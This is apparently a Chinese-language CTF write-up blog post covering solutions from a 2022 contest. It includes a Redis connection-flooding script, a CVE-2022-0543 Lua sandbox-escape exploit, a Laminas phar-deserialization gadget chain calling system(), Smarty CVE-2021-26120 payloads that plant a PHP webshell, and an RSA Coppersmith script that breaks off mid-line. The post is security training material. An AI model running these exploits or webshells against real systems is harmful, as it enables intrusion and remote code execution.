@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-ctf -web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 为什么说是赛后复现，因为大部分都没做出来，tcl（。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【数字中国创新大赛】赛后复现">
+<meta property="og:url" content="http://example.com/2022/03/22/%E3%80%90%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 为什么说是赛后复现，因为大部分都没做出来，tcl（。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-22T10:16:04.000Z">
+<meta property="article:modified_time" content="2022-03-24T06:19:41.084Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-ctf -web">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/03/22/【数字中国创新大赛】赛后复现/"/>
+
+
+
+
+
+  <title>【数字中国创新大赛】赛后复现 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/22/%E3%80%90%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【数字中国创新大赛】赛后复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-22T18:16:04+08:00">
+                2022-03-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>为什么说是赛后复现，因为大部分都没做出来，tcl（。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="虎符赛道"><a href="#虎符赛道" class="headerlink" title="虎符赛道"></a>虎符赛道</h1><h2 id="Plain-Text"><a href="#Plain-Text" class="headerlink" title="Plain Text"></a>Plain Text</h2><p>给了一串base64，解码后得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dOBRO POVALOWATX NA MAT^, WY DOLVNY PEREWESTI \TO NA ANGLIJSKIJ QZYK. tWOJ SEKRET SOSTOIT IZ DWUH SLOW. wSE BUKWY STRO^NYE. qBLO^NYJ ARBUZ. vELAEM WAM OTLI^NOGO DNQ.</span><br></pre></td></tr></table></figure>
+
+<p>啥玩意看得我一愣一愣的，各种尝试也没试出来，然后我队友放翻译软件里面试了试，发现有猫腻，发现是俄文，对应转化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">а-a、б-b、в-v、г-g、д-d、е-je、ё-jo、ж-zh、з-z、и-e、й-jj、к-k、л-l、м-m、н-n、о-o、п-p、</span><br><span class="line">р-r、с-s、т-t。</span><br><span class="line">у-u、ф-f、х-kh、ц-c、ч-ch、ш-sh、щ-sch、ъ-&quot; ы-y ь-&#x27;、э-eh、ю-ju、я-ja</span><br></pre></td></tr></table></figure>
+
+<p>因此原文转化为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">дОБРО ПОВАЛОШАТХ НА МАТ^,ШЫ ДОЛВНЫ ПЕРЕШЕСТИ эТО НА АНГЛИЙСКИЙ</span><br><span class="line">ЯЗЫК. тШОЙ СЕКРЕТ СОСТОИТ ИЗ ДBa СЛОBa. шСЕ БУКШЫ СТРО^НЫЕ.</span><br><span class="line">яБЛО^НЫЙ АРБУЗ. вЕЛАЕМ ШАМ ОТЛИ^НОГО ДНЯ.</span><br></pre></td></tr></table></figure>
+
+<p>最后翻译得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WELCOME TO MATH, YOU SHOULD TRANSFER THIS INTO ENGLISH</span><br><span class="line">LANGUAGE. YOUR SECRET IS A TWO WORD. SHSE BUKSHY STROKE.</span><br><span class="line">APPLE ^ WATERMELON. WE WILL HAVE A GOOD DAY. </span><br></pre></td></tr></table></figure>
+
+<h2 id="Quest-Crash"><a href="#Quest-Crash" class="headerlink" title="Quest-Crash"></a>Quest-Crash</h2><p>打崩redis就可以了，redis连接数超过10000后就会无法连接，一直发包就可以了。</p>
+<p>用bp或写exp都可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &quot;http://120.76.219.239:25502/sendreq&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line">headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,1000000):</span><br><span class="line">    data0 = &#123;</span><br><span class="line">        &quot;query&quot;: f&quot;SET \&quot;&#123;i&#125;\&quot; \&quot;&#123;str(i)*10000&#125;\&quot;&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data1 = &#123;</span><br><span class="line">        &quot;query&quot;: f&quot;GET \&quot;&#123;i&#125;\&quot;&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        &quot;query&quot;: &quot;GETFLAG&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r0 = s.post(url=url, data=json.dumps(data0), headers=headers)</span><br><span class="line">    r1 = s.post(url=url, data=json.dumps(data1), headers=headers)</span><br><span class="line">    r2 = s.post(url=url, data=json.dumps(data2), headers=headers)</span><br><span class="line">    print(r2.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Quest-RCE"><a href="#Quest-RCE" class="headerlink" title="Quest-RCE"></a>Quest-RCE</h2><p>万万没想到misc要用cve打，实在难崩，而且我前一天还刚刚看过p牛写的关于这个cve的文章，结果做的时候就忘了。（</p>
+<p>cve-2022-0543，Redis Lua 沙盒逃逸 RCE。<br>原理文章：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/123469465">CVE-2022-0543</a></p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">session = requests.Session()</span><br><span class="line">rawBody = &quot;&#123;\&quot;query\&quot;:\&quot;INFO\\neval &#x27;local io_l =</span><br><span class="line">package.loadlib(\\\&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\&quot;,</span><br><span class="line">\\\&quot;luaopen_io\\\&quot;); local io = io_l(); local f = io.popen(\\\&quot;cat /f*\\\&quot;,</span><br><span class="line">\\\&quot;r\\\&quot;); local res = f:read(\\\&quot;*a\\\&quot;); f:close(); return res&#x27; 0\&quot;&#125;&quot;</span><br><span class="line">headers = &#123;&quot;Origin&quot;:&quot;http://120.25.155.106:21570&quot;,&quot;Accept&quot;:&quot;*/*&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/99.0.4844.74</span><br><span class="line">Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://120.25.155.106:21570/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;</span><br><span class="line">Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125;</span><br><span class="line">response = session.post(&quot;http://120.25.155.106:25502/sendreq&quot;, data=rawBody,</span><br><span class="line">headers=headers)</span><br><span class="line">print(&quot;Status code: %i&quot; % response.status_code)</span><br><span class="line">print(&quot;Response body: %s&quot; % response.content)</span><br></pre></td></tr></table></figure>
+
+<h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><p>babysql和ezphp这两题暂时没时间或者环境原因还没有复现，等之后有条件了再复现。</p>
+<h1 id="红明谷赛道"><a href="#红明谷赛道" class="headerlink" title="红明谷赛道"></a>红明谷赛道</h1><h2 id="MissingFile"><a href="#MissingFile" class="headerlink" title="MissingFile"></a>MissingFile</h2><p>再也不相信取证了，直接string就能搜出来……</p>
+<p>或者010进去搜索字符串也可以</p>
+<h2 id="Fan-website"><a href="#Fan-website" class="headerlink" title="Fan website"></a>Fan website</h2><p><code>www.zip</code>源码泄露，下载下来审计，发现是laminas组件，并且找到下面这段代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function imgdeleteAction()</span><br><span class="line">&#123;</span><br><span class="line">    $request = $this-&gt;getRequest();</span><br><span class="line">    if(isset($request-&gt;getPost()[&#x27;imgpath&#x27;]))&#123;</span><br><span class="line">        $imgpath = $request-&gt;getPost()[&#x27;imgpath&#x27;];</span><br><span class="line">        $base = substr($imgpath,-4,4);</span><br><span class="line">        if(in_array($base,$this-&gt;white_list))&#123;     //白名单</span><br><span class="line">            @unlink($imgpath);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;Only Img File Can Be Deleted!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个地方通过删除文件可以触发phar反序列化，到时候专门写篇博客具体学习phar反序列化。</p>
+<p>接着发现有过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(in_array($base,$this-&gt;white_list))&#123;   //白名单限制</span><br><span class="line">                 $cont = file_get_contents($data[&quot;image-file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">                 if (preg_match(&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;, $cont )) &#123;</span><br><span class="line">                     die(&quot;Not This&quot;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 if($data[&quot;image-file&quot;][&quot;size&quot;]&lt;3000)&#123;</span><br><span class="line">                     die(&quot;The picture size must be more than 3kb&quot;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 $img_path = realpath(getcwd()).&#x27;/public/img/&#x27;.md5($data[&quot;image-file&quot;][&quot;name&quot;]).$base;</span><br></pre></td></tr></table></figure>
+
+<p>使用gzip压缩绕过前面的过滤，大小过滤使用<code>$phar-&gt;addFromString</code>写入进行绕过。接着通过现有的链子进行改编，得到exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">//https://xz.aliyun.com/t/8975</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Laminas\View\Resolver&#123;</span><br><span class="line">    class TemplateMapResolver&#123;</span><br><span class="line">        protected $map = [&quot;setBody&quot;=&gt;&quot;system&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Laminas\View\Renderer&#123;</span><br><span class="line">    class PhpRenderer&#123;</span><br><span class="line">        private $__helpers;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;__helpers = new \Laminas\View\Resolver\TemplateMapResolver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Laminas\Log\Writer&#123;</span><br><span class="line">    abstract class AbstractWriter&#123;&#125;</span><br><span class="line"></span><br><span class="line">    class Mail extends AbstractWriter&#123;</span><br><span class="line">        protected $eventsToMail = [&quot;cat /flag&quot;];          //  cmd  cmd cmd</span><br><span class="line">        protected $subjectPrependText = null;</span><br><span class="line">        protected $mail;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;mail = new \Laminas\View\Renderer\PhpRenderer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Laminas\Log&#123;</span><br><span class="line">    class Logger&#123;</span><br><span class="line">        protected $writers;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;writers = [new \Laminas\Log\Writer\Mail()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $a = new \Laminas\Log\Logger();</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = $a;</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, str_repeat(&quot;mrl64&quot;,999999));//添加文件，签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获取phar文件，如果报错的话可以去<code>php.ini</code>中更改配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Phar]</span><br><span class="line">; http://php.net/phar.readonly</span><br><span class="line">phar.readonly = Off</span><br></pre></td></tr></table></figure>
+
+<p>然后进行一波gzip打包，将文件后缀改为png后上传，最后在删除图片的路由下删除图片获取flag，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://./public/img/xxxxxxx.png</span><br></pre></td></tr></table></figure>
+
+<h2 id="Smarty-calculator"><a href="#Smarty-calculator" class="headerlink" title="Smarty_calculator"></a>Smarty_calculator</h2><p>仍然是<code>www.zip</code>源码泄露，首先是index.php中对cookie判断，因此发包时要在cookie上添加<code>login=1</code>。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>非预期解，接着审Smarty的代码，首先data传进后被display方法处理，因为包含了Smarty.class.php，因此从这个文件跟进。当时做题的时候没看出来问题在哪，后来去群里看了看发现这里存在一个cve：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42317626/article/details/116252415">php 沙箱逃逸,PHP Smarty模版代码注入漏洞（CVE-2021-26120</a><br><a target="_blank" rel="noopener" href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html">Smarty Template Engine Multiple Sandbox Escape PHP Code Injection Vulnerabilities</a></p>
+<p>然后群里的大佬说math那个地方存在eval函数，github上也存在相关测试数据。</p>
+<p>测试后发现function.math.php中存在报错。这个cve在这题中可以直接利用，不过要绕waf。</p>
+<p>先构造payload写入webshell，然后绕过即可，例如八进制、URL编码配合换行绕过等等：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=eval:&#123;$x=&quot;42&quot;&#125;&#123;math equation=&quot;(&quot;file_put_contents&quot;)(&quot;123.php&quot;,&quot;&lt;?php eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;&quot;)&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接后利用插件绕过disable_functions，在根目录获取flag。</p>
+<p>或者直接构造变量替换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=phpinfo();</span><br><span class="line">data=eval:&#123;$x = &quot;4&quot;&#125;&#123;$y = &quot;5.5&quot;&#125;&#123;math equation=&quot;`calc` x * y&quot; x=$x y=$y&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>官方wp中的方法，通过对比官方源码的区别找到正则，并且官方的<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/v3.1.39/CHANGELOG.md">CHANGELOG.md</a>中提到了安全问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;function name=&#x27;blah&#x27;&#125;&#123;/function&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过换行绕过正则读取phpinfo，发现open_basedir以及disable_functions，这里就可以写webshell或者通过ini_set配合 chdir的trick来绕过open_basedir读取flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=phpinfo();</span><br><span class="line">data=%7Bfunction%20name%3D&#x27;exp()%7B%7D%3Beval(%24_GET%5B1%5D)%3Bfunction%0A%0A&#x27;%7D%7B%2Ffunction%7D</span><br></pre></td></tr></table></figure>
+
+<h2 id="easy-ya"><a href="#easy-ya" class="headerlink" title="easy_ya"></a>easy_ya</h2><p>task.py:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from flag import flag</span><br><span class="line">def gen():</span><br><span class="line">    e = 3</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            p = getPrime(512)</span><br><span class="line">            q = getPrime(512)</span><br><span class="line">            n = p*q</span><br><span class="line">            phi = (p-1)*(q-1)</span><br><span class="line">            d = inverse(e,phi)</span><br><span class="line">            return p,q,d,n,e</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    return</span><br><span class="line">p,q,d,n,e = gen()</span><br><span class="line">r = getPrime(512)</span><br><span class="line">m = bytes_to_long(flag+os.urandom(32))</span><br><span class="line">M = m%r</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(&quot;r = %d&quot;%r)</span><br><span class="line">print(&quot;M = %d&quot;%M)</span><br><span class="line">print(&quot;n = %d&quot;%n)</span><br><span class="line">print(&quot;e = %d&quot;%e)</span><br><span class="line">print(&quot;c = %d&quot;%c)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473</span><br><span class="line">M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558</span><br><span class="line">n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287</span><br><span class="line">e = 3</span><br><span class="line">c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这题的本质是e低指数，但是不能用之前用的常规脚本，因为估计这个e不是整数，需要使用到coppersmith的求根方法对系数进行爆破，exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//sage</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473</span><br><span class="line">M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558</span><br><span class="line">n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287</span><br><span class="line">e = 3</span><br><span class="line">c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282</span><br><span class="line"></span><br><span class="line">kbits = 100</span><br><span class="line">m0 = M</span><br><span class="line">PR.&lt;x&gt; = 